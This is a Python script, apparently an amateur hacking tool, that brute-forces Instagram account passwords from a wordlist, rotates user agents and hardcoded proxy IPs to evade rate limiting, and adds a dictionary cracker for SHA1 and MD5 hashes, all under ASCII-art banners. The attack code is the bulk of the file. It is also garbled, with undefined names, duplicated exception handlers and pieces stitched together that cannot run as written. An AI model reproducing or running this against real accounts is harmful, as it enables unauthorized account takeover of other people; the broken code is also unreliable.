import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Style

# User-Agent randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def get_random_user_agent():
    return random.choice(user_agents)

def login_attempt(username, password, session):
    headers = {'User-Agent': get_random_user_agent()}
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    payload = {'username': username, 'password': password}
    
    try:
        response = session.post(login_url, data=payload, headers=headers)
        if 'authenticated' in response.text and 'true' in response.text:
            return True  # Successfully logged in
        return False  # Failed to log in
    except requests.exceptions.RequestException as e:
        print(f"Error during login attempt: {e}")
        return False

def bruteforce_login(username, password_list):
    session = requests.Session()
    for password in password_list:
        print(f"Trying password: {password}")
        if login_attempt(username, password, session):
            print(f"Success! Password found: {password}")
            return
        time.sleep(random.uniform(1, 3))  # Random sleep between 1 to 3 seconds to avoid overloading the server

def start_bruteforce():
    username = input("Enter Instagram username: ")
    password_list_path = input("Enter the path to your password list: ")
    
    # Read the password list
    with open(password_list_path, 'r') as file:
        password_list = [line.strip() for line in file.readlines()]
    
    # Use ThreadPoolExecutor for concurrent attempts
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(lambda password: bruteforce_login(username, password_list), password_list)

if __name__ == "__main__":
    start_bruteforce()
    print("Brute force attack finished.")
    print("Please note that brute-forcing accounts is illegal and unethical. Use this script responsibly.")



print('''\033[95m
                                                           / /
                                                        | | |  /
                                                         \|_|_/
                                                       ,--/.__/--'
                       _.-/   _   \-._                    .'|
                     .'::(_,-' `-._)::`.                  |:|
                    (:::::::::::::::::::)                .':|
                     \_:::;;;::::;;;:::/    /            |::|
             \        ,---'..\::/..`-.'    /             |::|
              \       \_;:....|'...:_ )   /             .'=||fffhh
               \.       )---. )_.--&lt; (   /'             ||=||
                \\     //|:: /--\:::\\\ //             _||= |
                 \\   ||::\:|----|:/:||/--.______,--==' \ - /
          -._     \`.  \\:|:|-- -|:\:/-.,,\\  .----'//'_.`-'
      \.     `-.   \ \ _|:|:|-- -|::||::\,,||-'////---' |/'
       \\       `._)\ / |\/:|-/|--\:/|. :\_,'---'       /
        \\_      /,,\/:.'\\/-.'`-.-//  \ |
        /`\-    //,,,' |-.\-'\--/|-/ ./| |             /
         /||-   ||, /| |\. |.-==-.| . /| |            | /
 __  |    /||-  ||,,\- | .  \;;;;/ .  .':/         _,-=/-'
/  \//    /||-  ' `,-|::\ . \,..,/   /: /         /.-'
,--||      /||-/.-.'  \  `._ `--' _.' .'|        //
.--||`.    /||//\ '   |-'.___`___' _,'|//       /;
  /\| \     ///\ /     \\_`-.`--`-'_==|'       /;'
 / |'\ \.   //\ /       \_\__)\`==-_'_|       / /
  .'  \.=`./|\ /          \`-- \--._/_/------( /
       \.=| `_/|-          |\`-| -/| `--------'respect
        \\` ./|-/-         |\`-| |-|     ________
         `--\ |=|'        _|\`-| |-|----'.-._ ..\`-.
             -|-|-     .-':`-;-| |./.-.-( | ||..|=-\\
             `'= /'   / ,--.:|-| ||_|_|_|_|-'__ .`-._)
              /|-|- .' /\ \ \|-` \\ ____,---'  `-. ..|
               /\=\/..'\ \_&gt;-'`-\ \'              \ .|
               `,-':/\`.&gt;' |\/ \/\ \              `- |
               //::/\ \/_/|-' \/| \ `.            / ||
              / (:|\ \/) \ \|.'-'  `-\\          |;:|\_
             || |:`-/:.'-|-' \|       \\          `;_\-`-._
             \\=/:_/::/\| \|          |\\            `-._ =`-._
              \_)' |:|                | //               `--.__`-.
                   |:|                                         )\|
                   /;/                                         / (\_
                  / /                                         |\\;;_`-.
                _/ /                                          ' `---\.-\
               /::||
              /:::/
             //;;'             
             `-'

\033[0m''')
os.system('figlet -f font.flf brute eagle | lolcat')

print("")
print("\33[94m⊰᯽⊱┈──╌❊   KARTIK SHARMA ❊╌──┈⊰᯽⊱ \t")
print("\33[94m⊰᯽⊱┈──╌❊ CODED BY > RESPECT', soloXrespect ❊╌──┈⊰᯽⊱ \t")

# Add proxy configuration
http_proxy = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
ftp_proxy = "ftp://10.10.1.10:3128"
proxyDict = {
    "http": "120.236.74.213:9002, 188.123.114.167:80, 185.82.139.1:443, 1.10.231.42:8080",
    "https": "158.69.53.98:9300, 193.201.228.121:80, 31.186.239.245:8080, 112.217.162.5:3128",
    "ftp": "36.91.166.98:8080, 188.132.222.3:8080, 188.132.221.24:8080, 185.230.48.164:32650"
}

# initialize counter and proxy switch flag
failed_attempts = 0
use_proxy = False
proxy_list = ["120.236.74.213:9002", "188.123.114.167:80", "185.82.139.1:443"]
proxy_index = 0

for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(5) # add a delay of 5 seconds before each login attempt)
        print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
        if use_proxy:
            # use proxy if flag is set
            session = requests.Session()
            session.proxies = {"http": proxy_list[proxy_index]}
            L.context._session = session
        L.login(USER, PASSWORD)
        print("\n\033[94m[✓] Password found: \033[92m"+pstest)
        veri_break = "si"
        break
    except instaloader.exceptions.BadCredentialsException:
        print(bcolors.FAIL+"\033[91m[!] Incorrect password: "+pstest)
        failed_attempts += 1
        if failed_attempts >= 9:
            # switch to using a different proxy after 9 failed attempts
            use_proxy = True
            failed_attempts = 0 # reset counter after switching to new proxy
            proxy_index = (proxy_index + 1) % len(proxy_list) # cycle through proxies in the list
            print(bcolors.WARNING +
                  "\n[!] Switching to new proxy server: " + proxy_list[proxy_index])
    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL +
              "\n\033[91m[!] Instagram has been requested verification via sms, try to set more login time...")
        break
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n\033[91m[☹] Username not found")

        break
    except instaloader.exceptions.TwoFactorAuthRequiredException:

        print(bcolors.FAIL+"\n\033[91m[!] Two-factor authentication required")
        two_factor_code = input("Enter the two-factor authentication code: ")
        L.login(USER, PASSWORD, two_factor_code=two_factor_code)
        print(bcolors.OKGREEN+"\n\033[92m[✓] Password found: "+pstest)
        veri_break = "si"
        break

    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\n\033[91m[!] Connection error")
        break
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        print(bcolors.FAIL+"\n\033[91m[!] Two-factor authentication required")
        two_factor_code = input("Enter the two-factor authentication code: ")
        L.login(USER, PASSWORD, two_factor_code=two_factor_code)
        print(bcolors.OKGREEN+"\n\033[92m[✓] Password found: "+pstest)
        veri_break = "si"
        break
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n\033[91m[☹] Username not found")
        break
    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\n\033[91m[!] Connection error")
        break
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        print(bcolors.FAIL+"\n\033[91m[!] Two-factor authentication required")
        two_factor_code = input("Enter the two-factor authentication code: ")
        L.login(USER, PASSWORD, two_factor_code=two_factor_code)
        print(bcolors.OKGREEN+"\n\033[92m[✓] Password found: "+pstest)
        veri_break = "si"
        break
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n\033[91m[☹] Username not found")
        break
    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\n\033[91m[!] Connection error")
        break
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        two_factor_code = input("Enter the two-factor authentication code: ")
        L.login(USER, PASSWORD, two_factor_code=two_factor_code)
        print(bcolors.OKGREEN+"\n\033[92m[✓] Password found: "+pstest)
        veri_break = "si"
        break
colorama.init()
print(Fore.GREEN + Style.BRIGHT)
print(r"  ______       ________         _______.     ______       ________     ______     ___________  ")
print(r" |  __  \     |   ____|        /       |    |   _  \      |   ____|   /      \   |___________|  ")
print(r" | |__|  |    |  |__           |  (----`    |  |_)  |     |  |__     |  ,----'       |  |           ")
print(r" |  __  /     |   __|          \   \        |   ___/      |   __|    |  |            |  |           ")
print(r" | |  \ \     |  |____     .-----) |        |  |          |  |____   |  `----.       |  |   ")
print(r" \_|   \ \    |_______|    |_______/        | _|          |_______|   \_______|      |__|     ")
print(Fore.RESET + Style.NORMAL)
print()                                                                                     
print(Fore.GREEN + Style.BRIGHT)
print(r".  ______      ___           _______.     _______.____    __    ____  ______   .______       _______  ")
print (r"  |   _  \    /   \         /       |    /       |\   \  /  \  /   / /  __  \  |   _  \     |       \ ")
print (r"  |  |_)  |  /  ^  \       |   (----`   |   (----` \   \/    \/   / |  |  |  | |  |_)  |    |  .--.  |")
print(r"  |   ___/  /  /_\  \       \   \        \   \      \            /  |  |  |  | |      /     |  |  |  |")
print(r"  |  |     /  _____  \  .----)   |   .----)   |      \    /\    /   |  `--'  | |  |\  \----.|  '--'  |")
print(r"  | _|    /__/     \__\ |_______/    |_______/        \__/  \__/     \______/  | _| `._____||_______/ ")
print(r"                                                                                                    ")
print(r"              ______ .______          ___       ______  __  ___  _______ .______                    ")
print(r"             /      ||   _  \        /   \     /      ||  |/  / |   ____||   _  \                   ")
print(r"            |  ,----'|  |_)  |      /  ^  \   |  ,----'|  '  /  |  |__   |  |_)  |                  ")
print(r"            |  |     |      /      /  /_\  \  |  |     |    <   |   __|  |      /                   ")
print(r"            |  `----.|  |\  \----./  _____  \ |  `----.|  .  \  |  |____ |  |\  \----.              ")
print(r"             \______|| _| `._____/__/     \__\ \______||__|\__\ |_______|| _| `._____|              ")
print()


while True:
    # We will determine the type of hash to be cracked
    print()
    print ("Enter Type of Hash to be cracked (Select 3 to quit the script)!\n 1. SHA1 Hash \n 2. MD5 Hash \n 3. Quit Script")
    print() 
    k = input(">")

    if (k=="1"):
        passFound = False
        # We'll import the hashlib library to use the sha1 hashing algorithm
        # We'll get the hash from the user to get the sha1 hash to crack

        sha1hash = input("Please input the SH1 hash to crack.\n>")

        # We'll open a file full of password guesses

        with open ("file.txt","r") as file:


        # We'll take a guess from the list of passwords we opened, and split it by line

            for guess in file:

            # We'll hash the guess we took from the password list so we can compare it to the hash the user gave us
                hashedGuess = hashlib.sha1(bytes(guess.strip(), 'utf-8')).hexdigest()

            # We'll compare the hash the user gave us to the hashed version of the password guess and determine if they are equal

                if hashedGuess.upper() == sha1hash.upper():

            # We'll tell the program what to do if the password guess matches, which is to print the current guess and quit the program.
            # We'll also tell the program what to do if the password guess don't match, which is to return to step 3 to get a new password from the list

                    print("The password is ", str(guess))
                    passFound=True
                    break
                elif hashedGuess != sha1hash:
                    print("Password guess ",str(guess)," does not match, trying next...")

        # We'll tell the program what to do if we get all the way through the password list without finding a match.
        if (passFound==False):
            print("Password not in database, we'll get them next time.")

    elif (k=="2"):
        passFound = False
        # We'll get the hash from the user to get the sha1 hash to crack

        md5hash = input("Please input the MD5 hash to crack.\n>")

        # We'll open a file full of password guesses

        with open ("file.txt","r") as file:


        # We'll take a guess from the list of passwords we opened, and split it by line

            for guess in file:

            # We'll hash the guess we took from the password list so we can compare it to the hash the user gave us
                hashedGuess = hashlib.md5(bytes(guess.strip(), 'utf-8')).hexdigest()

            # We'll compare the hash the user gave us to the hashed version of the password guess and determine if they are equal

                if hashedGuess.upper() == md5hash.upper():

            # We'll tell the program what to do if the password guess matches, which is to print the current guess and quit the program.
            # We'll also tell the program what to do if the password guess don't match, which is to return to step 3 to get a new password from the list

                    print("The password is ", str(guess))
                    passFound=True
                    break
                elif hashedGuess != md5hash:
                    print("Password guess ",str(guess)," does not match, trying next...")

        # We'll tell the program what to do if we get all the way through the password list without finding a match.
        if (passFound==False):
            print("Password not in database, we'll get them next time.")

    elif (k=="3"):
        quit()